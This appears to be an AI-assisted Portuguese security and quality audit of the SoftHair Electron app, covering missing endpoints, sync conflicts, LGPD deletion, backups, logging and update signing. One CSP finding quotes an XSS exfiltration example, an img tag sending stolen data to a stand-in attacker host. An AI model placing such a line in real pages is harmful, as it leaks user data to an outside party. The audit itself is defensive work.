# Electron Audit Pass 6

Sexta passada. Branch `claude/brave-beaver-6c804d`.

Pass 5 entregou 4 críticos + 10 altos + 10 médios + 7 baixos = **31 itens**. Pass 6 verifica os fixes e cobre 16 ângulos novos.

---

## Verificação Pass 5

| Item | Fix esperado | Verificação | Status |
|---|---|---|---|
| P5-C1 safeStorage migration | encriptar JWT secret + sync token via DPAPI/Keychain/libsecret | `electron/main.js:144-212` `migrateSecretsToSafeStorage()` implementado com fallback graceful para plaintext. Em Linux com libsecret (verificado: `pkg-config --exists libsecret-1` OK; `gnome-keyring` instalado), `safeStorage.isEncryptionAvailable()` retorna true. Migration de payload v1 → v2 atomic via tmp+rename. Bug: chamada `migrateSecretsToSafeStorage` apenas em `app.isPackaged` (linha 393). Em dev/AppImage não-empacotado, secrets continuam plaintext mesmo com keyring disponível. Aceitável (dev). | OK |
| P5-C2 electron-updater | publish github + autoUpdater + dialog não-intrusiva | `electron/main.js:74-142` `setupAutoUpdater()`. `package.json:81-87` publish github. **MAS** `electron-updater` em `dependencies` (^6.3.9) e instalação falha — `npm ls` reporta UNMET. Em prod, falha graceful via try/catch + warn (linha 80-82). Sem code-signing — atacante MitM pode injetar binary maligno (electron-updater valida SHA256 mas o arquivo `latest.yml` GitHub serve via HTTPS, mitigando). Documentado em SECURITY.md:181-190. | OK (com nota signing) |
| P5-C3 StubGlobalBanner | banner global em resposta `stub:true` | `frontend/src/services/api.js:48-71` interceptor emite `softhair:stub-response` CustomEvent. `frontend/src/components/StubGlobalBanner.jsx:37-82` escuta e mostra banner amarelo dismissible. Montado em `Layout.jsx:386`. Pretty-fy de URL para nomes humanos. Implementação aditiva — não mexe nas telas existentes. | OK |
| P5-C4 conflict resolution | sync_conflicts table + upsertRow check + endpoint | `initDb.js:205-216` cria tabela. `syncService.js:619-706` `upsertRow` detecta conflito comparando `updated_at` ISO lex; insere em `sync_conflicts` + retorna sem sobrescrever. `routes/sync.js:12-76` endpoints `GET /sync/conflicts` + `POST /sync/conflicts/:id/resolve`. Teste em `tests/syncService.test.js:78-101` passa (skipped por better-sqlite3 binding mismatch no host, mas lógica verificada). **UI ausente** — `pages/Sync.jsx` NÃO consome esses endpoints. Conflitos ficam acumulando sem revisão humana. | PARCIAL (backend OK, frontend ausente) |
| P5-A1 comissões + despesas | endpoints + UI | `routes/comissoes.js` GET retorna agregação SQL real. `routes/despesas.js` CRUD funcional. Teste manual: backend boota com tabela `despesas` em SQLite. **MAS** `pages/Despesas.jsx:160-162` lê `resumoData.categorias` mas backend retorna `porCategoria` (line 49 de despesas.js). Bug visual: cards por categoria nunca renderizam. Frontend também envia query params `mes`/`ano` que backend ignora (espera `dataInicio`/`dataFim`). Comissões: backend OK mas frontend não chama `/api/comissoes` (apenas `/api/comissoes/pagas` e `/estornos` que continuam stub). | PARCIAL (bugs de contrato) |
| P5-A2 LGPD delete-data | endpoint + UI Configuracoes | `routes/auth.js:199-285` endpoint `POST /me/delete-account-data` implementado: re-valida senha, DELETE em ordem de FK, apaga secrets/sync-config/backups/logs e `process.exit(0)`. **MAS** `pages/Configuracoes.jsx` NÃO TEM botão "Apagar dados". O endpoint existe mas user nunca consegue chamar. P5-A2 fix incompleto. | PARCIAL (backend OK, UI ausente) |
| P5-A3 WS noop documentado | comentário + roadmap | `useWebSocket` (Pass 4) já tem detecção. Pass 5 não adicionou novo. Aceito. | OK |
| P5-A4 schema drift | doc canonical | Não há `SoftHair/docs/sync-schema-drift.md` em disco. Apenas comments em `syncService.js:46-83` TABLE_COLUMNS. Documentação ausente — fix Pass 5 incompleto. | NÃO APLICADO |
| P5-A5 funções > 100 linhas | split createWindow + initDb | `electron/main.js` 809 linhas (cresceu de 609 por causa de safeStorage + autoUpdater). `createWindow` ~200 linhas. `initDb` 245 linhas. Split não foi feito. Aceito como roadmap. | NÃO APLICADO |
| P5-A6 async-trap detection | throw em AsyncFunction | `database.js:181-200` adicionou warning (dev) mas NÃO throw — manteve compat. Comentário documenta. Heurística parcial. | PARCIAL |
| P5-A7 backup automático | cron diário + retention 7 | `routes/backup.js:77-105` `startAutomaticBackup()` setInterval 1h, dispara se ultimo > 24h. Retention 7 via `pruneOldBackups`. Chamado em `require()` do módulo — roda no boot do backend. Verificado por boot manual: cron loop começa após 30s. | OK |
| P5-A8 ALLOWED_ORIGINS dinâmico | PORT do env | `server.js:75-83` constrói com `parseInt(process.env.PORT)`. Confirmado. | OK |
| P5-A9 tests integration | auth.flow + backup | `tests/syncService.test.js` adicionado (conflict detection) mas auth.flow e backup tests AUSENTES. Tarefa parcial. | PARCIAL |
| P5-A10 disconnect race | await syncPromise + _disconnecting | `syncService.js:358-397` implementado: flag `_disconnecting` + await `syncPromise` + `saveConfig` early-return se flag (linha 300). | OK |
| P5-M1 Login 429 lockout | state + countdown | `pages/Login.jsx:30-67` implementado. Lockout 15min, countdown em segundos no error message. | OK |
| P5-M2 Backup download | endpoint + UI button | `routes/backup.js:117-133` endpoint funcional. **MAS** `pages/Backup.jsx` NÃO TEM botão "Baixar". Fix backend mas UI incompleta. | PARCIAL (backend OK) |
| P5-M3 crash dumps cap 5 | sort+slice | `main.js:725-732` cap em 5 mais recentes implementado. | OK |
| P5-M4 sync loop fix | _recentlyPulled Map | `syncService.js:204-207, 536-540, 599-603` implementado. TTL=2 cobre 1 ciclo. | OK |
| P5-M5 api.js 401 desloga | interceptor catch | `frontend/src/services/api.js:64-70` redirecionando para `/login` em 401. | OK |
| P5-M6 SQLite cleanup em crash | shutdownBackend + SIGTERM 5s | `main.js:790-798` implementado, chamado em uncaughtException (linha 672). | OK |
| P5-M7 saveConfig early return | check fields | `syncService.js:301-305` early-return se nenhum field. | OK |
| P5-B1 private:true | package.json | `package.json:92` `"private": true` confirmado. | OK |
| P5-B4 logs gzip | zlib.gzipSync no rotate | `main.js:333-340` confirmado, fallback graceful para `.old` plaintext se gzip falha. | OK |
| P5-B5 dead pages deletar | Register.jsx + ResetPassword.jsx | confirmados deletados (`ls` retorna no such file). | OK |
| P5-B6 SECURITY.md safeStorage | doc | `SECURITY.md:217+` seção `safeStorage (P5-C1)` adicionada. | OK |

**Resumo verificação:** 14/25 OK · 7 PARCIAIS · 4 NÃO APLICADOS.

**Parciais críticos:**
1. **P5-C4 conflict UI ausente** — backend funcional, mas conflitos ficam acumulando sem possibilidade de revisão pelo user. Banco enche silenciosamente, e o user nunca sabe que perdeu mudanças.
2. **P5-A2 delete-data UI ausente** — endpoint LGPD existe mas user não tem como acessar. Em compliance audit, recurso "esquecimento" não é demonstrável.
3. **P5-M2 backup download UI ausente** — endpoint existe mas Backup.jsx não tem botão.
4. **P5-A1 despesas contract drift** — bug visual em /despesas; cards por categoria não renderizam por causa de `porCategoria` vs `categorias`.

---

## CRITICOS Pass 6

### [P6-C1] Múltiplas rotas frontend chamam endpoints inexistentes no backend embarcado — 404 silenciosos em produção

**Arquivos:** `SoftHair/backend/src/server.js` (lista de rotas), `SoftHair/frontend/src/services/api.js`

**Descrição:** O frontend chama 17+ endpoints que **NÃO existem** no backend embarcado e tampouco caem no stub:

| Endpoint | Chamado por | Resultado |
|---|---|---|
| `GET /financeiro/dre` | `Financeiro.jsx:32` AbaDRE | 404 — tela DRE quebra |
| `GET /financeiro/projecao` | `Financeiro.jsx:38, 113` | 404 — projeção quebra |
| `GET /bloqueios` | `bloqueiosAPI.getByData` | 404 |
| `POST /bloqueios` | idem | 404 |
| `DELETE /bloqueios/:id` | idem | 404 |
| `GET /configuracoes` | `configuracoesAPI.getAll` | 404 |
| `PUT /configuracoes` | idem | 404 |
| `PUT /saloes/me` | `saloesAPI.updateMe` | 404 (stub só responde GET `/me`) |
| `GET /agendamentos/pendentes` | `agendamentosAPI.getPendentes` | 404 |
| `GET /agendamentos/proximos` | `agendamentosAPI.getProximos` | 404 |
| `POST /agendamentos/converter/:id` | `agendamentosAPI.converter` | 404 |
| `POST /agendamentos/converter-todos` | `agendamentosAPI.converterTodos` | 404 |
| `POST /atendimentos/fechamento` | `atendimentosAPI.fechamento` | 404 |
| `GET /produtos/categorias` | `produtosAPI.getCategorias` | 404 |
| `GET /servicos/categorias` | `servicosAPI.getCategorias` | 404 |
| `GET /vendas/estatisticas` | `vendasAPI.getEstatisticas` | 404 |
| `GET /app/pedidos/*` | mobile flows | 404 |
| `POST /auth/forgot-password` | `authAPI.forgotPassword` | 404 |
| `POST /auth/reset-password` | `authAPI.resetPassword` | 404 |
| `POST /auth/change-password` | `authAPI.changePassword` | 404 |
| `GET /comissoes` (lista real) | nenhum lugar do frontend | só `/pagas` e `/estornos` stubados |

Resultado:
- Tela /financeiro nunca mostra DRE (carrega vazio, lança erro em useQuery → render fallback). User vê "Carregando..." infinito ou tela em branco.
- Tela /agenda chama `/agendamentos/proximos` e `/agendamentos/pendentes` — falham, banner de notificações de novos agendamentos morre.
- Tela /agenda chama `/bloqueios?data=...` — sem bloqueios, slots aparecem todos disponíveis (correctness bug — pode duplicar agendamento em bloqueio "real").
- Forgot password / reset password — telas referenciadas em routes mas mortas.

**Fix Pass 6:**
- Adicionar stubs explícitos para endpoints sem implementação real para que retornem `{ success: true, data: [], stub: true, message: 'Em desenvolvimento' }` em vez de 404. Garante que o banner stub aparece em vez de erro genérico.
- Implementar `/financeiro/dre` (calculado a partir de vendas + comissões + despesas — todos já têm queries reais), `/financeiro/projecao` (histórico 12 meses), `/agendamentos/proximos`, `/agendamentos/pendentes` (basic SQL), `/produtos/categorias`, `/servicos/categorias`, `/vendas/estatisticas`, `/atendimentos/fechamento`.
- Para `/bloqueios`, criar tabela e CRUD básico.
- Para `/configuracoes`, criar tabela key-value.
- `/saloes/me` PUT, criar update simples.
- `/auth/forgot-password`, `/auth/reset-password`, `/auth/change-password` — em standalone sem email server, sempre 501 com mensagem clara.

**Severidade:** Crítico para UX. Sem fix, várias telas inteiras estão quebradas e user enxerga app como "bug everywhere".

### [P6-C2] Sync conflict resolution UI ausente — backend acumula `sync_conflicts` sem possibilidade humana de resolver

**Arquivos:** `SoftHair/frontend/src/pages/Sync.jsx`

**Descrição:** Pass 5 P5-C4 entregou:
- Tabela `sync_conflicts`.
- `upsertRow` detecta `local_updated_at > remote_updated_at` e registra.
- Endpoints `GET /sync/conflicts` e `POST /sync/conflicts/:id/resolve`.

Mas o frontend `Sync.jsx` NÃO consome nenhum deles. Conflitos podem ocorrer (cenário 2 PCs editando o mesmo cliente offline) e ficam para sempre na tabela como `resolved=0`. Não há sinal visual ao user, não há lista, não há ação. Banco enche infinitamente.

**Exploit cenário:**
1. PC A edita cliente "João Silva" → `nome = 'João S. Silva'`, sync OFF.
2. PC B edita o mesmo cliente → `nome = 'João Silva (cliente VIP)'`, sync OFF.
3. Ambos ligam sync.
4. PC A push → cloud recebe. PC B push → cloud sobrescreve.
5. PC A pull → versão B vem. `upsertRow` detecta local > remoto se PC A modificou pós-PC-B. Registra conflito.
6. PC A nunca vê. Mudança "João S. Silva" perdida silenciosa.

**Fix Pass 6:** Adicionar a `Sync.jsx`:
- Query `useQuery({ queryKey: ['sync-conflicts'] })` polling 10s.
- Card "Conflitos pendentes (N)" com badge vermelho.
- Lista expandível: tabela, registro_id, timestamps, diff visual local vs remote.
- Botões "Manter local" / "Aplicar remoto" por linha.
- Banner global de notificação se N > 0 (similar ao StubGlobalBanner).

**Severidade:** Crítico para correctness + UX. Sem isso, dados perdidos = compliance LGPD broken.

### [P6-C3] LGPD delete-data sem UI — endpoint inutilizado, recurso "esquecimento" não demonstrável

**Arquivos:** `SoftHair/frontend/src/pages/Configuracoes.jsx`

**Descrição:** Pass 5 P5-A2 entregou endpoint `POST /api/auth/me/delete-account-data` que purga todos os dados do banco + arquivos + force restart. Mas `Configuracoes.jsx` (75 linhas, apenas perfil + atalho launcher) NÃO TEM botão para chamar essa rota. User precisaria conhecer a URL e usar curl.

LGPD art. 18 — titular dos dados pode requerer exclusão. Sem UI, recurso não é demonstrável em compliance audit.

**Fix Pass 6:**
- Adicionar seção "Privacidade e Dados" em Configuracoes.jsx.
- Botão vermelho "Apagar todos os dados deste salão (irreversível)".
- Modal de confirmação:
  - Texto: "Esta ação apaga PERMANENTEMENTE todos os dados deste salão. Faça backup antes."
  - Input para re-confirmação da senha.
  - Checkbox "Entendo que esta ação é irreversível".
  - Botão "Apagar tudo" (vermelho, disabled até checkbox).
- Após chamada, mostrar "Dados apagados. O sistema será reiniciado..." e aguardar process.exit do backend.

**Severidade:** Crítico para compliance LGPD. Recurso documentado mas não entregável.

### [P6-C4] Backup download endpoint sem UI — backup off-PC vira workflow manual

**Arquivos:** `SoftHair/frontend/src/pages/Backup.jsx`

**Descrição:** Pass 5 P5-M2 entregou endpoint `GET /api/backup/download/:filename`. Mas `Backup.jsx` lista os backups e oferece apenas "Restaurar" — sem botão "Baixar". User precisa abrir manualmente `userData/SoftHair/database/backups/` no Explorer para copiar para pendrive.

Disaster recovery off-PC depende de cópia manual. Em ambiente Windows típico de salão (1 PC, 1 funcionário), isso quase nunca acontece.

**Fix Pass 6:**
- Adicionar botão "Baixar" por linha na tabela de backups.
- `onClick` → cria URL com token + filename, dispara `window.location.href` ou anchor download.
- Cuidado: em Electron file:// o `window.open` para um endpoint autenticado precisa do token no header. Solução: fazer `api.get('/backup/download/:filename', { responseType: 'blob' })` + `URL.createObjectURL` + `<a download>`.

**Severidade:** Crítico para disaster recovery. Sem isso, backup local fica no mesmo SSD que pode falhar.

---

## ALTOS Pass 6

### [P6-A1] Pagina Despesas com bug de contrato — cards "por categoria" não renderizam

**Arquivos:** `SoftHair/backend/src/routes/despesas.js:49-61`, `SoftHair/frontend/src/pages/Despesas.jsx:160-172`

**Descrição:** Backend retorna `{ total, count, porCategoria }`. Frontend lê `resumoData.categorias`. Cards de categoria sempre vazios. Adicionalmente, frontend envia `?mes=X&ano=Y` e backend espera `?dataInicio=&dataFim=`. Filtros não funcionam.

**Fix Pass 6:**
- Backend: aceitar tanto `mes/ano` quanto `dataInicio/dataFim` e converter. Retornar tanto `porCategoria` quanto `categorias` (aliases).
- Mais limpo: alinhar frontend ao backend. Renomear no frontend para `porCategoria` e enviar `dataInicio/dataFim` calculados a partir do mes/ano.

**Severidade:** Alta — feature inteira degradada para o user (despesas mensais).

### [P6-A2] Console.log em produção — vaza dados de runtime

**Arquivos:** `frontend/src/pages/Atendimentos.jsx:78-310` (dezenas), `services/api.js:144-149`

**Descrição:** Atendimentos.jsx tem 10+ console.log em fluxos críticos (update mutation, loadAtendimentoForEdit, submit) que vazam `id`, `formData`, `atendimento` no DevTools. Em prod (DevTools bloqueado P4-C2) o impacto é menor, mas:
- Em dev mode, qualquer XSS leak imediato.
- console.log também alimenta `process.stdout` em Electron — pode acabar em logs `userData/logs/softhair-*.log`.
- Vaza estrutura interna para anyone com acesso temporário ao PC.

**Fix Pass 6:** Wrap console.log em `if (import.meta.env.DEV)` ou remover de uma vez.

**Severidade:** Alta para data hygiene.

### [P6-A3] Concurrent users no mesmo PC — Windows multi-user vê dados misturados

**Arquivos:** `SoftHair/electron/main.js:372` (`app.getPath('userData')`)

**Descrição:** `app.getPath('userData')` retorna `%APPDATA%\SoftHair\` no Windows e `~/.config/SoftHair/` no Linux — por user, OK em teoria. **MAS** em Windows com 2 contas e ambas têm SoftHair instalado, cada um lê seu próprio. **Sem problema fundamental.**

Cenário real: 1 PC do salão, 2 funcionários logam alternadamente no Windows. Cada um vê seu próprio banco — não compartilham clientes nem agenda. **Bug experiencial:** funcionário B cadastra cliente, funcionário A nunca vê.

**Fix Pass 6:** Documentar em INSTALL.md o pattern:
- Para 1 salão = 1 user Windows compartilhado (recomendado).
- Multi-user OS exige sync com cloud (Render) habilitado.
- Alternativa: instalar em `Program Files` (`C:\ProgramData\SoftHair`) compartilhado — requer ajuste de `app.setPath('userData', ...)` ou env override.

Adicionar suporte env `SOFTHAIR_DATA_DIR_OVERRIDE` para apontar para pasta compartilhada (já existe `SOFTHAIR_DATA_DIR` na backend, mas o Electron main usa `app.getPath('userData')` direto antes de calcular). Mover lógica para função única.

**Severidade:** Alta para deployment multi-user.

### [P6-A4] SQLite VACUUM nunca rodado — banco fragmenta com DELETE/UPDATE constantes

**Arquivos:** `backend/src/config/database.js:138-142`, `backend/src/services/syncService.js`, `backend/src/routes/backup.js`

**Descrição:** SQLite com WAL mode acumula páginas vazias após DELETE (LGPD delete-data faz DELETE em massa). VACUUM REBUILD o arquivo, recupera espaço, reorganiza B-trees. Sem isso, banco de 50K linhas com churn pode ficar 200MB enquanto dados reais ocupariam 50MB.

`PRAGMA auto_vacuum = INCREMENTAL` ajuda mas não recupera fragmentação total.

**Fix Pass 6:**
- Adicionar `PRAGMA auto_vacuum = INCREMENTAL` em database.js após `journal_mode = WAL`.
- Cron mensal: `setInterval(() => db.exec('PRAGMA incremental_vacuum'); db.exec('PRAGMA optimize')`, 30 dias).
- Antes de VACUUM completo, criar backup pré-vacuum.

**Severidade:** Alta para performance long-term + disco.

### [P6-A5] Sem testes de boot end-to-end — bugs como P6-C1 (404 routes) deveriam ter sido pegos

**Arquivos:** `SoftHair/backend/tests/`

**Descrição:** Tests existentes cobrem unit functions. Não há teste que:
- Faça `app.listen()` mock.
- Itere todos os endpoints do `api.js` do frontend.
- Verifique que cada um retorna 200/401/404 conforme expectativa.
- Bug P6-C1 (17 endpoints 404) deveria ser caught automaticamente.

**Fix Pass 6:** Adicionar `tests/integration/routes-coverage.test.js`:
- Carrega `server.js`.
- Faz request para cada endpoint da lista (extraída de `api.js`).
- Asserta que nenhuma retorna 404 (deve ser 200, 401, 501, ou erro de validação — nunca rota não-encontrada).

**Severidade:** Alta para CI gating + regression prevention.

### [P6-A6] Auto-update sem code signing — usuário não sabe se update veio do publisher legítimo

**Arquivos:** `SoftHair/package.json`, `electron/main.js:74-142`

**Descrição:** electron-updater verifica SHA256 do binary contra `latest.yml` no GitHub Release. Como `latest.yml` vem via HTTPS do GitHub, atacante MitM legítimo (cert válido) precisaria comprometer GitHub para injetar binário malicioso — defesa razoável.

Mas:
- Update vem com `.exe` não-assinado. SmartScreen do Windows vai bloquear ou avisar "Editor desconhecido".
- User com má experiência clica "Executar mesmo assim" porque costume.
- Atacante que tenha acesso physical ao PC pode substituir o `.exe` cached em userData antes de quitAndInstall.

**Fix Pass 6:**
- Documentar em SECURITY.md o gap atual de signing.
- Verificar que `autoUpdater.signRequest` ou similar está ativo (electron-updater por padrão verifica assinatura se houver).
- Adicionar `verifyUpdateCodeSignature: false` explicito para Windows com warning no log.
- Roadmap: comprar cert EV para signing (preço ~$300/ano).

Implementação concreta: não há fix real sem cert. Documentar como ACEITO.

**Severidade:** Alta mas com mitigação documentada.

### [P6-A7] Render fallback timeout — sync com cloud lento bloqueia app

**Arquivos:** `backend/src/services/syncService.js:444` (`timeout: 15000`)

**Descrição:** Timeout do axios para `cloudUrl` é 15s. Em Render free tier, instância sleeping pode demorar 30-60s para acordar (cold start). Sync first request da manhã falha. P3-C2 (já fixed) tem retry exponencial?

Verificação: `_doSync` em syncService.js NÃO tem retry — falha vai pro `lastError` e próxima iteração tenta de novo em 30s. Se cloud está sleeping, primeira tentativa falha, segunda também (ainda acordando). Terceira em 60s pega.

**Fix Pass 6:**
- Aumentar timeout para 45s (cobre cold start típico).
- Distinguir erro de timeout vs erro real (HTTP status). Em timeout, retry em 5s antes de aceitar como falha (uma vez).
- UI mostra "Aguardando servidor..." em vez de "Erro" durante cold-start.

**Severidade:** Alta para UX em sync first-of-day.

### [P6-A8] Setup wizard sem mensagem de erro em rede/SQLite local

**Arquivos:** `frontend/src/pages/Login.jsx:46-57`

**Descrição:** Setup wizard chama `/auth/needs-setup` no boot. Se backend ainda não startou (race em Electron prod), chamada falha. Catch silencia: `setNeedsSetup(false)`. User vê tela de login direto sem chance de bootstrap, e login falha porque não há admin.

**Fix Pass 6:**
- No catch, distinguir erro de rede (ECONNREFUSED) vs 404. Em rede, mostrar "Aguardando backend..." com retry automático a cada 1s.
- Adicionar timeout do retry — após 30s sem resposta, mostrar "Backend não respondeu. Verifique se o app está rodando corretamente. (logs)".

**Severidade:** Alta para first-run UX. Em PC lento, race é real.

### [P6-A9] Logs vazam JWT em estados parciais

**Arquivos:** `backend/src/server.js:108`, `electron/main.js` (appendLog catches)

**Descrição:** Logger backend redacta `token|senha|password=value` em query strings. **Mas:**
- Authorization header não é logado direto, mas `req.headers.host` é. Token vem em Bearer header — sem leak diretamente.
- Em uncaughtException no Electron, `err.stack` pode incluir token se o token estiver em uma function arg (ex: `buildAxiosConfig`). Improvável mas possível.
- `appendLog(`[backend] ${line}`)` repassa stdout do backend para `userData/logs/`. Se backend dev printa `console.log('Token:', token)`, vaza.

Verificação atual: `grep -rn "console.log.*token" backend/src/` — nenhum match óbvio. OK.

**Fix Pass 6:**
- Adicionar mask em `appendLog` que redacta `Bearer XXX` e `eyJ[A-Za-z0-9_=.-]+` (JWT pattern).
- Documentar contrato: nunca logar `req.headers.authorization` direto.

**Severidade:** Alta defensive.

### [P6-A10] Input validation no frontend ausente — depende inteiramente do backend

**Arquivos:** `frontend/src/pages/Clientes.jsx`, `Despesas.jsx`, todas as forms

**Descrição:** Forms validam apenas `required` HTML + `type="email"`. Sem regex CPF/telefone/CEP. Frontend manda payload mal-formado e backend responde 400 (com `errors` array do express-validator) que UI exibe genericamente. Round-trip desperdiçado, UX ruim.

**Fix Pass 6:** Adicionar validação client-side mínima:
- CPF: `/^\d{11}$/` ou `/^\d{3}\.\d{3}\.\d{3}-\d{2}$/`.
- Telefone: `/^\d{10,11}$/`.
- CEP: `/^\d{8}$/`.
- Email: regex já feito por `type="email"`.
- Valor (despesa, venda): `parseFloat > 0`.
- Helper `validateField(value, type)` reusável.

**Severidade:** Alta para UX.

---

## MEDIOS Pass 6

### [P6-M1] StubGlobalBanner pode aparecer N vezes — sem deduplicação

**Arquivos:** `frontend/src/components/StubGlobalBanner.jsx:38-51`

**Descrição:** Cada `softhair:stub-response` event recria o estado. Se 5 chamadas stub em 5s, banner pisca rapidamente, último vence. User confunde qual feature está em desenvolvimento.

**Fix Pass 6:** Acumular múltiplos urls em lista, mostrar contador.

**Severidade:** Médio UX.

### [P6-M2] electron-updater dialog não mostra release notes

**Arquivos:** `electron/main.js:111-128`

**Descrição:** Quando update-downloaded, dialog mostra apenas "Versão X pronta. Clique para reiniciar." Não exibe release notes. User não sabe o que mudou.

**Fix Pass 6:** Em `update-downloaded`, info inclui `info.releaseNotes` (string) ou `info.releaseNotesFile`. Mostrar no `detail` do dialog (limitado a 500 chars).

**Severidade:** Médio UX.

### [P6-M3] safeStorage migration não cobre `sync-config.json`

**Arquivos:** `electron/main.js:144-212`

**Descrição:** Pass 5 P5-C1 migra `secrets.json` para safeStorage. Mas `sync-config.json` (contém token cloud criptografado via chave derivada do JWT_SECRET) NÃO foi migrado para safeStorage diretamente. Cadeia:
- `secrets.json` agora protegido por DPAPI.
- Mas a chave de cripto do `sync-config.json` ainda é derivada do JWT_SECRET (HMAC-SHA256).
- Atacante com acesso físico ao PC e descrypt do DPAPI obtém JWT_SECRET, decifra sync-config.

Defesa em profundidade pede que `sync-config.json` também use safeStorage diretamente.

**Fix Pass 6:** Em `syncService.encryptToken/decryptToken`, se safeStorage está disponível (via env injetado pelo main.js), usar `safeStorage.encryptString` em vez de chave derivada. Manter compat com formato antigo.

Implementação requer IPC bridge — backend embarcado é processo separado e não tem acesso direto a `electron.safeStorage`. Solução: main.js encrypta sync token e injeta no fork via env. Mudança intrusiva — aceitar como roadmap.

**Severidade:** Médio defesa em profundidade.

### [P6-M4] Backup automático não rodam em `process.env.NODE_ENV === 'test'`

**Arquivos:** `backend/src/routes/backup.js:79`

**Descrição:** Linha 79 retorna se NODE_ENV='test'. Correto para evitar criar arquivos durante testes. Mas em prod, se algum script seta NODE_ENV='test' acidentalmente (ex: rodando teste como user final), backup nunca dispara. Cenário improvável.

**Fix Pass 6:** Aceitar.

### [P6-M5] `appendLog` sem rate-limit — flood quando backend printa muito

**Arquivos:** `electron/main.js:321-345`

**Descrição:** Cada `data` event do stdout/stderr do backend dispara `appendLog`. Se backend entrar em loop log infinito, disco enche em segundos. Rotação ajuda mas só ao atingir 10MB.

**Fix Pass 6:** Adicionar rate-limit no appendLog: ignore se últimas 100 linhas chegaram em <1s.

**Severidade:** Médio defensive.

### [P6-M6] Dexie ainda em node_modules — não removido

**Arquivos:** `frontend/node_modules/dexie/`

**Descrição:** `npm ls` reporta `dexie@4.4.2 extraneous`. Removido das deps em P4-A1 mas continua no disco. Bundle Vite não inclui sem import — sem impacto runtime. Cosmético.

**Fix Pass 6:** Rodar `npm prune` no frontend para limpar.

**Severidade:** Baixo (cosmético).

### [P6-M7] CSP do frontend permite `img-src https:` — exfil via DNS prefetch

**Arquivos:** `frontend/index.html:11`

**Descrição:** CSP `img-src 'self' data: https:` permite carregar imagem de qualquer host HTTPS. Atacante XSS (já dentro) pode criar `<img src="https://evil.com/?data=${stolen}">` para exfiltrar via DNS/access log.

**Fix Pass 6:** Restringir img-src a allowlist conhecida (avatars do user, etc.). Difícil pois não há servidor central. Aceitar com nota.

**Severidade:** Médio defensive (depende de XSS dentro).

### [P6-M8] React Query sem `retry: false` para mutations — 401 retry desperdiça

**Arquivos:** `frontend/src/main.jsx` ou queryClient setup

**Descrição:** Default React Query retry 3x. Em 401, 3 retries antes de dar up. User espera 3-5s extras. P5-M5 fix interceptor desloga em 401 — mas reactQuery ainda re-tenta.

**Fix Pass 6:** queryClient config `defaultOptions.mutations.retry = false` e `defaultOptions.queries.retry = (failureCount, error) => error?.response?.status !== 401 && failureCount < 3`.

**Severidade:** Médio UX.

### [P6-M9] Setup wizard senha não tem indicador visual de força

**Arquivos:** `frontend/src/pages/Login.jsx:186-200`

**Descrição:** Validação é só "8+ chars maiúscula minúscula número" no submit. Sem indicador em tempo real. User digita senha fraca, recebe rejeição só ao clicar.

**Fix Pass 6:** Adicionar componente `<PasswordStrength value={pwd} />` com barra colorida + checklist.

**Severidade:** Médio UX.

### [P6-M10] `.env` template para frontend ausente

**Arquivos:** raiz do frontend (sem `.env.example`)

**Descrição:** INSTALL.md menciona `VITE_API_URL` mas não há `.env.example` para novo dev clonar e copiar.

**Fix Pass 6:** Criar `frontend/.env.example` com `VITE_API_URL=http://127.0.0.1:3001/api`.

**Severidade:** Baixo onboarding.

---

## BAIXOS Pass 6

### [P6-B1] `electron-updater` em deps mas não instalado — build falha

**Arquivos:** `package.json:94`, lock state

**Descrição:** `npm ls` mostra UNMET DEPENDENCY. node_modules root vazio. CI/CD pode quebrar se rodar `npm ci` sem build de electron.

**Fix:** documentar em INSTALL.md que `npm install` na raiz é obrigatório antes do build:electron.

### [P6-B2] `dexie` extraneous no node_modules

**Arquivos:** `frontend/node_modules/dexie`

**Descrição:** P6-M6 idem.

### [P6-B3] axios/vite versões mismatch entre package.json e lock

**Arquivos:** `frontend/package-lock.json`

**Descrição:** package.json pede `axios ^1.16.0` e `vite ^8.0.12`. Instalado `axios@1.14.0` e `vite@5.4.21`. Lock está atrasado.

**Fix:** rodar `npm install` no frontend para atualizar.

### [P6-B4] CLAUDE.md aponta paths Windows obsoletos no worktree atual

**Arquivos:** Vault references `C:\Users\guise\Documents\MONEY\` — Linux runtime user é `/home/ogejota/Documentos/SOFTHAIR/MONEY/`

**Descrição:** Documentação aponta para Windows mas codebase está em worktree Linux. Causa confusão se outro dev pega.

**Fix:** Adicionar nota em CLAUDE.md sobre worktree multi-OS.

### [P6-B5] `electron-updater` autoInstallOnAppQuit pode interromper venda

**Arquivos:** `electron/main.js:85`

**Descrição:** `autoInstallOnAppQuit = true` significa que ao fechar o app, update é aplicado. Se user fechar no meio de digitar venda (não salva), próximo boot tem update mas perdeu dados unsaved. Sem auto-save de forms.

**Fix:** Adicionar warning em close se forms unsaved. Ou marcar autoInstall=false e exigir user click.

### [P6-B6] Console.log em frontend `Atendimentos.jsx` — 10+ ocorrências

**Arquivos:** `frontend/src/pages/Atendimentos.jsx`

**Descrição:** P6-A2 idem.

### [P6-B7] Logo / branding inconsistente

**Arquivos:** `frontend/src/pages/Login.jsx` (Scissors icon), `Backup.jsx` (Database icon), README.md (sem icon mention)

**Descrição:** App não tem logo/ícone próprio — só usa lucide-react icons genéricos. Build referencia `build/icon.ico` em `package.json:64` mas nenhum desses arquivos existe em disco.

**Fix:** Adicionar `build/icon.ico`, `build/icon.icns`, `build/icon.png`. Ou remover referências do package.json até ter.

---

## Resumo

**Novos issues Pass 6:**

| Severidade | Count | IDs |
|---|---|---|
| Críticos | 4 | P6-C1 a P6-C4 |
| Altos | 10 | P6-A1 a P6-A10 |
| Médios | 10 | P6-M1 a P6-M10 |
| Baixos | 7 | P6-B1 a P6-B7 |
| **Total** | **31** | |

**Verificação Pass 5:** 14/25 OK · 7 PARCIAIS · 4 NÃO APLICADOS.

**Parciais Pass 5 reabertos em Pass 6:**
- P5-C4 conflict UI → P6-C2
- P5-A2 delete-data UI → P6-C3
- P5-M2 backup download UI → P6-C4
- P5-A1 despesas contract → P6-A1
- P5-A4 schema-drift doc → permanece roadmap
- P5-A5 funções >100 linhas → permanece roadmap
- P5-A6 async-trap → mantido warning, sem throw
- P5-A9 tests integration → P6-A5

**Descobertas-chave Pass 6:**

1. **17+ endpoints frontend → backend ausentes (P6-C1)** — várias telas inteiras chamam rotas 404. Audit prévios miraram apenas o sync; rotas regulares foram negligenciadas.

2. **Conflict resolution UI completamente ausente (P6-C2)** — backend pronto, banco já registra. User nunca vê.

3. **LGPD delete-data ainda inacessível (P6-C3)** — endpoint sem UI = recurso documentado mas não entregável.

4. **Backup download endpoint sem UI (P6-C4)** — disaster recovery off-PC depende de Explorer manual.

5. **Despesas contract drift (P6-A1)** — bug visual em feature core.

